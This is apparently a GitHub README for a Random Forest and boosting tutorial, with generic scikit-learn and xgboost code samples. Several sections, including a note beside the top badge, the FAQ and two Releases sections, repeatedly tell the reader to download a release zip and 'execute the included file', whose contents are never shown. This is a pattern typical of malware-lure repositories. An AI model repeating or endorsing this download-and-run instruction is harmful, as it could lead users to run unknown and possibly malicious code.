[![Releases](https://img.shields.io/badge/Releases-download-brightgreen)](https://github.com/WhiteDeath1209/Random-Forest-Classifier/releases) (download and execute the included file)

# Random Forest & Boosting: Bagging, AdaBoost, XGBoost 🌲⚡

[![Python](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/)
[![scikit-learn](https://img.shields.io/badge/scikit--learn-1.0-green)](https://scikit-learn.org/)
[![xgboost](https://img.shields.io/badge/xgboost-1.6-orange)](https://xgboost.readthedocs.io/)
[![Topics](https://img.shields.io/badge/topics-adaboost%20%7C%20bagging%20%7C%20boosting-blueviolet)](https://github.com/WhiteDeath1209/Random-Forest-Classifier)
[![License](https://img.shields.io/badge/license-MIT-lightgrey)](LICENSE)

Preview image:
![Ensemble illustration](https://upload.wikimedia.org/wikipedia/commons/7/76/Random_forest_diagram.png)

This repository collects code, examples, and experiments for ensemble classifiers. It covers Random Forests, Bagging, AdaBoost, and XGBoost. It shows how to train, tune, evaluate, and deploy these models on tabular data. It includes scripts, notebooks, and a packaged release. Download the release and run the included script to run the demo.

Table of contents
- About this repo
- Key features
- When to use each method
- Quick start (download and run)
- Installation (dev & prod)
- Project layout
- Data and preprocessing
- Hands-on code samples
  - Random Forest (scikit-learn)
  - Bagging Classifier
  - AdaBoost Classifier
  - XGBoost (sklearn API & native)
- Training, validation, metrics
- Hyperparameter tuning
- Model introspection
  - Feature importance
  - Partial dependence
  - SHAP
- Production tips
  - Saving and loading
  - Batch inference
  - Online inference
- Performance tips for large data
- Reproducible experiments
- CI, tests, and release process
- Contribute
- License
- References
- FAQ
- Releases

About this repo
- It bundles stable scripts and notebooks to run ensemble models on tabular data.
- It shows standard workflows for training and tuning.
- It shows evaluation methods for classification tasks.
- It shows how to export models for production.

Key features
- Implementations and examples for:
  - Random Forest Classifier (scikit-learn)
  - Bagging Classifier (scikit-learn)
  - AdaBoost Classifier (scikit-learn)
  - XGBoost (xgboost)
- End-to-end example pipeline:
  - Data load, preprocess, train, validate, test
  - Model save/load
  - Feature importance and SHAP plots
  - Metrics and reporting
- Scripts that run from a release bundle.
- Jupyter notebooks for step-by-step learning.
- Example config for hyperparameter tuning.
- Test cases for core modules.

When to use each method
- Random Forest
  - Use when you want robust out-of-the-box performance.
  - It handles mixed feature types and missing values (to some extent).
  - It resists overfitting via averaging across trees.
- Bagging Classifier
  - Use when a base estimator overfits.
  - Bagging reduces variance by training many models on bootstrap samples.
- AdaBoost
  - Use when you need a strong sequential ensemble.
  - It focuses on hard-to-predict samples using weighted updates.
- XGBoost
  - Use when you need high accuracy with speed.
  - It implements advanced regularization and fast tree learning.
  - Use for structured tabular tasks, competition-grade models.

Quick start (download and run)
- Download the release package from the Releases page and run the demo script.
- The release bundle contains a runnable script and example data. Download and execute the included file.
- Example file in release: Random-Forest-Classifier_release_v1.0.zip
  - Steps:
    - Download: visit https://github.com/WhiteDeath1209/Random-Forest-Classifier/releases and download Random-Forest-Classifier_release_v1.0.zip
    - Extract: unzip Random-Forest-Classifier_release_v1.0.zip
    - Run demo: bash run_demo.sh
    - Or run the Python demo: python run_demo.py --config configs/demo.yaml
- The release contains the model scripts and a sample dataset. The demo trains several classifiers and writes results to results/.

Installation (dev & prod)
- Create a virtual environment:
  - python -m venv venv
  - source venv/bin/activate
- Install required packages:
  - pip install -r requirements.txt
- Core packages:
  - numpy, pandas, scikit-learn, matplotlib, seaborn, xgboost, joblib, shap
- Optional:
  - dask-ml or sklearnex for larger workloads
  - mlflow for experiment tracking
- For GPU XGBoost:
  - pip install xgboost==1.6.2  (with GPU support where available)
- For Windows:
  - Use venv or conda and match library versions.

Project layout
- README.md (this file)
- LICENSE
- requirements.txt
- run_demo.py
- run_demo.sh
- configs/
  - demo.yaml
  - tuning.yaml
- src/
  - data.py           # load and split data
  - preprocess.py     # pipelines and transforms
  - models.py         # model factories, trainer functions
  - metrics.py        # metrics and scoring helpers
  - explain.py        # shap and feature importances
  - utils.py          # helpers
- notebooks/
  - rf_basics.ipynb
  - bagging_adaboost_xgboost.ipynb
- assets/
  - images/           # plots and visuals
- tests/
  - test_models.py
- docs/
  - how_to_use.md
- releases/
  - Random-Forest-Classifier_release_v1.0.zip

Data and preprocessing
- The repo works with tabular CSV data.
- Expect a target column and feature columns.
- Steps:
  - Load data with pandas.
  - Split into train / validation / test.
  - Handle missing values:
    - For numeric: use median or a model-based imputer.
    - For categorical: use a separate category or mode.
  - Encode categorical data:
    - For low-cardinality features: use OneHotEncoder.
    - For high-cardinality: use target encoding or frequency encoding.
  - Scale numeric columns if a model needs it:
    - Tree models do not need scaling.
  - Deal with imbalance:
    - Use class_weight in tree models.
    - Use resampling (SMOTE) in pipeline when needed.

Example preprocessing pipeline (scikit-learn)
- Use ColumnTransformer to apply transforms per type.
- Use SimpleImputer, OneHotEncoder, OrdinalEncoder when needed.
- Fit on train. Transform on validation and test.

Hands-on code samples

Random Forest (scikit-learn)
- Use this when you want a strong baseline.
- Code sample:

```python
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report
import joblib

# load X, y from your data loader
X_train, X_test, y_train, y_test = train_test_split(X, y, stratify=y, test_size=0.2, random_state=42)

model = RandomForestClassifier(
    n_estimators=200,
    max_depth=None,
    min_samples_split=2,
    min_samples_leaf=1,
    max_features='sqrt',
    n_jobs=-1,
    random_state=42,
)

model.fit(X_train, y_train)

y_pred = model.predict(X_test)

print(classification_report(y_test, y_pred))

# Save model
joblib.dump(model, "rf_model.joblib")
```

Notes on hyperparameters
- n_estimators: more trees reduce variance. Use power-of-two choices: 100, 200, 500.
- max_features: 'sqrt' often works for classification.
- max_depth: None lets trees grow. Use small depths on noisy data.
- min_samples_leaf: larger values smooth predictions.

Bagging Classifier
- Use a strong base estimator that overfits on small data.
- Code sample:

```python
from sklearn.ensemble import BaggingClassifier
from sklearn.tree import DecisionTreeClassifier

base = DecisionTreeClassifier(max_depth=None, min_samples_leaf=1, random_state=42)
bag = BaggingClassifier(
    base_estimator=base,
    n_estimators=100,
    max_samples=0.8,
    max_features=1.0,
    bootstrap=True,
    n_jobs=-1,
    random_state=42,
)

bag.fit(X_train, y_train)
print(classification_report(y_test, bag.predict(X_test)))
```

AdaBoost Classifier
- AdaBoost uses weighted boosting of base learners.
- Typical base learner: shallow decision tree stumps.
- Code sample:

```python
from sklearn.ensemble import AdaBoostClassifier
from sklearn.tree import DecisionTreeClassifier

base = DecisionTreeClassifier(max_depth=1, random_state=42)
ada = AdaBoostClassifier(
    base_estimator=base,
    n_estimators=200,
    learning_rate=0.5,
    algorithm='SAMME.R',
    random_state=42,
)

ada.fit(X_train, y_train)
print(classification_report(y_test, ada.predict(X_test)))
```

XGBoost
- Use xgboost for speed and fine control.
- Show two styles: sklearn wrapper and native xgboost API.

sklearn wrapper:

```python
from xgboost import XGBClassifier

xgb = XGBClassifier(
    n_estimators=300,
    learning_rate=0.05,
    max_depth=6,
    subsample=0.8,
    colsample_bytree=0.8,
    use_label_encoder=False,
    eval_metric='logloss',
    n_jobs=-1,
    random_state=42,
)

xgb.fit(X_train, y_train, eval_set=[(X_test, y_test)], early_stopping_rounds=50, verbose=False)
print(classification_report(y_test, xgb.predict(X_test)))
```

native xgboost (DMatrix and train):
```python
import xgboost as xgb
dtrain = xgb.DMatrix(X_train, label=y_train)
dtest = xgb.DMatrix(X_test, label=y_test)
params = {
    "objective": "binary:logistic",
    "eta": 0.05,
    "max_depth": 6,
    "subsample": 0.8,
    "colsample_bytree": 0.8,
    "eval_metric": "auc",
}
bst = xgb.train(params, dtrain, num_boost_round=1000, evals=[(dtest, "test")], early_stopping_rounds=50)
y_pred = (bst.predict(dtest) > 0.5).astype(int)
```

Training, validation, metrics
- Use stratified splits for classification.
- Keep a hold-out test set for final evaluation.
- Use cross-validation for robust estimates.
- Key metrics:
  - Accuracy
  - Precision, recall, F1
  - ROC AUC
  - PR AUC for imbalanced tasks
- Save confusion matrix and classification report.
- Use scikit-learn's cross_val_score, cross_validate, and StratifiedKFold.

Example cross-validation:
```python
from sklearn.model_selection import cross_validate, StratifiedKFold

cv = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)
scoring = ['accuracy', 'precision_macro', 'recall_macro', 'f1_macro', 'roc_auc']
scores = cross_validate(model, X_train, y_train, cv=cv, scoring=scoring, n_jobs=-1)
```

Hyperparameter tuning
- Use RandomizedSearchCV for large spaces.
- Use GridSearchCV for focused tuning.
- Use Bayesian optimization for more efficiency (optuna, skopt).
- Typical search space for Random Forest:
  - n_estimators: [100, 200, 500]
  - max_depth: [None, 6, 10, 20]
  - min_samples_split: [2, 5, 10]
  - min_samples_leaf: [1, 2, 4]
  - max_features: ['sqrt', 'log2', 0.2, 0.5, None]
- For XGBoost:
  - learning_rate: [0.01, 0.05, 0.1]
  - max_depth: [3, 6, 8]
  - subsample: [0.6, 0.8, 1.0]
  - colsample_bytree: [0.6, 0.8, 1.0]
  - reg_alpha: [0, 0.5, 1]
  - reg_lambda: [1, 2, 4]

Code sample for RandomizedSearchCV:
```python
from sklearn.model_selection import RandomizedSearchCV

param_dist = {
    "n_estimators": [100, 200, 500],
    "max_depth": [None, 6, 10],
    "max_features": ['sqrt', 'log2'],
    "min_samples_split": [2, 5],
    "min_samples_leaf": [1, 2, 4],
}

rs = RandomizedSearchCV(RandomForestClassifier(random_state=42), param_distributions=param_dist, n_iter=25, cv=3, scoring='f1_macro', n_jobs=-1, random_state=42)
rs.fit(X_train, y_train)
print("Best params", rs.best_params_)
```

Model introspection

Feature importance
- Random Forest and XGBoost supply feature importance scores.
- Use model.feature_importances_ for tree models.
- Plot top features with a bar chart.

Partial dependence
- Use PartialDependenceDisplay from scikit-learn to see marginal effects.
- Choose two-way PDP to inspect interactions.

SHAP
- Use SHAP to explain single predictions and global trends.
- Use TreeExplainer for tree models.

SHAP sample:
```python
import shap

explainer = shap.TreeExplainer(model)
shap_values = explainer.shap_values(X_sample)
shap.summary_plot(shap_values, X_sample)
```

Production tips

Saving and loading
- For scikit-learn models, use joblib.dump and joblib.load.
- For XGBoost, use model.save_model and model.load_model.
- Save a pipeline that includes preprocessing and model.

Example:
```python
from sklearn.pipeline import Pipeline
from joblib import dump, load

pipeline = Pipeline([
    ('preprocess', preprocess_pipeline),
    ('model', RandomForestClassifier(n_estimators=200, random_state=42)),
])

pipeline.fit(X_train, y_train)
dump(pipeline, "pipeline.joblib")

# load
pipeline = load("pipeline.joblib")
```

Batch inference
- Load the pipeline and call predict or predict_proba on a batch.
- Use joblib parallel backend if needed.

Online inference
- Export the model to a microservice.
- Wrap preprocessor and model in the service.
- Use fastapi or flask for a small web service.

Performance tips for large data
- Use Dask or Spark for data loading and preprocessing at scale.
- Use hist-based tree algorithms (LightGBM, XGBoost histogram) for memory.
- Tune subsample and colsample_bytree to reduce cost.
- Use incremental training (xgboost supports boosting rounds).
- Consider sklearn's warm_start for RandomForest-like ensembles if memory allows.

Memory tips
- Use sparse encodings for one-hot with many categories.
- Cast ints to smaller types when safe.
- Drop unused columns.

Reproducible experiments
- Use explicit random_state across splits and models.
- Log parameters and metrics to MLflow or a CSV.
- Save the env (pip freeze > requirements.txt).
- Save the seed and config file with results.

CI, tests, and release process
- Include unit tests for data loaders and model factories.
- Run tests on each PR.
- Release process:
  - Tag a release
  - Build release zip with scripts, notebooks, and a small sample dataset
  - Upload to GitHub Releases
  - The release contains a runnable demo and install instructions
- The release bundle includes an executable script. Download the release package and run the script to reproduce the demo.

Contribute
- Fork and open a PR.
- Write tests for new features.
- Keep code style consistent.
- Add examples when you add new algorithms.

License
- MIT License. See LICENSE file.

References
- scikit-learn: https://scikit-learn.org
- xgboost: https://xgboost.readthedocs.io
- SHAP: https://github.com/slundberg/shap
- Ensemble methods overview: Hastie, Tibshirani, Friedman — The Elements of Statistical Learning

FAQ

Q: Where do I get the runnable demo?
A: Visit the Releases page and download the release file. The release contains a runnable demo script. Download and execute the included file from https://github.com/WhiteDeath1209/Random-Forest-Classifier/releases

Q: Can I use the code for regression?
A: Yes. Replace classifier classes with regressors (RandomForestRegressor, XGBRegressor, etc.) and adapt metrics.

Q: Can I use categorical data with XGBoost?
A: New XGBoost versions support native categorical handling. Alternatively encode categories before training.

Q: How do I handle imbalanced classes?
- Use class_weight in sklearn estimators.
- Use sample weighting in XGBoost via scale_pos_weight.
- Use resampling (SMOTE, undersample) with care.

Q: Which model runs fastest?
- XGBoost and LightGBM use optimized learners. RandomForest scales well with parallelism.

Q: How to compare models?
- Use the same train/validation/test splits.
- Use cross-validation with fixed random_state.
- Track metrics and runtime.

Example end-to-end workflow
1. Load raw CSV file with pandas.
2. Clean data and handle missing values.
3. Split into train/validation/test with stratify.
4. Build ColumnTransformer with imputation and encoders.
5. Train baseline RandomForest. Save results.
6. Train tuned XGBoost. Save results.
7. Compare metrics and select model.
8. Explain model with SHAP plots.
9. Export pipeline and archive model.

Example script usage
- Demo run:
  - python run_demo.py --config configs/demo.yaml --out results/demo
- To run specific models:
  - python run_demo.py --model random_forest --n_estimators 200
  - python run_demo.py --model xgboost --learning_rate 0.05

Example config (configs/demo.yaml)
```yaml
data:
  path: data/sample.csv
  target: target
  test_size: 0.2
  val_size: 0.1

model:
  name: random_forest
  random_forest:
    n_estimators: 200
    max_depth: null
    max_features: sqrt

training:
  cross_val_folds: 5
  random_state: 42
  save_model: true

output:
  dir: results/demo
```

Tests and quality
- Unit tests for models live in tests/.
- Run tests:
  - pytest -q

Releases
- The project uses GitHub Releases for packaged demos and artifacts.
- Download the release and run the bundled demo script. The release contains a runnable file. Visit this Releases page to download: https://github.com/WhiteDeath1209/Random-Forest-Classifier/releases and run the included file.

Badges and topics
- Topics: adaboost, bagging-ensemble, boosting-ensemble, bootstraping, decision-trees, ensemble-model, machine-learning, random-forest, random-forest-classifier, supervised-learning, xgboost

Useful commands
- Lint:
  - flake8 src tests
- Format:
  - black src tests
- Run demos:
  - bash run_demo.sh
- Run a single notebook:
  - jupyter nbconvert --to notebook --execute notebooks/rf_basics.ipynb --ExecutePreprocessor.timeout=600

Common pitfalls
- Do not leak test data into training by tuning on test.
- Use stratified splits for unbalanced targets.
- Monitor early stopping on validation set for XGBoost.

Example evaluation table (format to export as CSV)
- model, accuracy, f1_macro, roc_auc, train_time_s, params
- RandomForest, 0.87, 0.84, 0.92, 120, {...}
- XGBoost, 0.90, 0.88, 0.95, 80, {...}
- AdaBoost, 0.85, 0.82, 0.91, 60, {...}

Visualization tips
- Plot ROC and PR curves.
- Log feature importances and SHAP summary plots.
- Visualize learning curves to detect overfitting.

Security and privacy
- Do not include sensitive data in the repo.
- Keep secrets out of config files.

Contact and support
- Open an issue on GitHub for bug reports or feature requests.
- Submit a PR for code changes.

Releases (again)
- To reproduce the packaged demo, download the release bundle and run the demo script. The release file in the Releases section must be downloaded and executed. Visit the Releases page: https://github.com/WhiteDeath1209/Random-Forest-Classifier/releases and download the appropriate asset. The package contains run_demo.sh and run_demo.py to run the examples.

Images and assets
- The repo includes visual assets in assets/images/ to illustrate models and plots.
- Use these images in docs and notebooks.

This README provides a full reference and should guide a user from setup to production for Random Forest and boosting-based classifiers.